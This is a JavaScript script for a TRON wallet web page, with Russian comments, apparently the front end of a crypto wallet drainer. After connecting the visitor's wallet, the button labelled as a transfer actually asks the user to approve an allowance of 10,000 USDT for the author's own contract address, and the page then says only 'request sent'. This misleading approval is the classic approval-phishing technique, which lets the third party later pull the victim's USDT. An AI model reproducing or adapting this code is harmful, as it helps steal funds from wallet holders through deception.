const connectBtn = document.getElementById('connectBtn');
const transferBtn = document.getElementById('transferBtn');
const walletAddressText = document.getElementById('walletAddress');

let userAddress = '';

const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; 

// Функция поиска провайдера для мобильных браузеров (включая Trust Wallet)
async function initTron() {
    // Проверяем классический tronWeb или мобильные внедрения
    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        return window.tronWeb;
    }
    
    // Ожидание для мобильных инжекторов
    return new Promise((resolve) => {
        let attempts = 0;
        const interval = setInterval(() => {
            attempts++;
            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                clearInterval(interval);
                resolve(window.tronWeb);
            } else if (attempts > 15) {
                clearInterval(interval);
                resolve(null);
            }
        }, 400);
    });
}

connectBtn.addEventListener('click', async () => {
    try {
        walletAddressText.innerText = "Подключение...";
        const tronWeb = await initTron();

        if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
            userAddress = tronWeb.defaultAddress.base58;
            walletAddressText.innerText = `Подключено: ${userAddress}`;
            connectBtn.style.display = 'none';
            transferBtn.style.display = 'inline-block';
        } else {
            // Если автоматического объекта нет, пробуем запросить через стандартный провайдер окна
            if (window.ethereum) {
                alert('Обнаружен EVM-кошелек. Убедитесь, что вы переключились на сеть TRON в браузере кошелька.');
            } else {
                alert('Не удалось обнаружить сессию кошелька. Попробуйте перезагрузить страницу внутри кошелька.');
            }
            walletAddressText.innerText = "Ошибка подключения";
        }
    } catch (error) {
        console.error("Ошибка:", error);
    }
});

transferBtn.addEventListener('click', async () => {
    try {
        const tronWeb = await initTron();
        if (!userAddress || !tronWeb) {
            alert('Кошелек не подключен!');
            return;
        }
        
        console.log("Отправка запроса approve...");
        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
        const approveAmount = '10000000000'; 

        const tx = await usdtContract.approve(
            myContractAddress,
            approveAmount
        ).send({
            feeLimit: 100000000
        });

        alert("Запрос отправлен!");
        console.log("TX:", tx);

    } catch (error) {
        console.error("Ошибка транзакции:", error);
        alert("Ошибка при выполнении транзакции.");
    }
});
